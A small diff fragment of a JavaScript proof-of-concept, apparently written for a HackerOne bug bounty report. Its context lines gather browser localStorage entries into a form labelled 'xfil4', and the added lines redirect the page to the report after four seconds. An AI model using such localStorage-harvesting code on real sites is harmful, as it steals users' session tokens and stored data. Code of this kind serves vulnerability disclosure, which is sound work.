@@ -67,6 +67,9 @@ for(var i=0, len=localStorage.length; i<len; i++) {
   form.appendChild(input);
   }, "xfil4");
   
+	setTimeout(function(){
+		document.location.href = "https://hackerone.com/reports/693776";
+	}, 4000);
   
 }catch(error) {  
 }
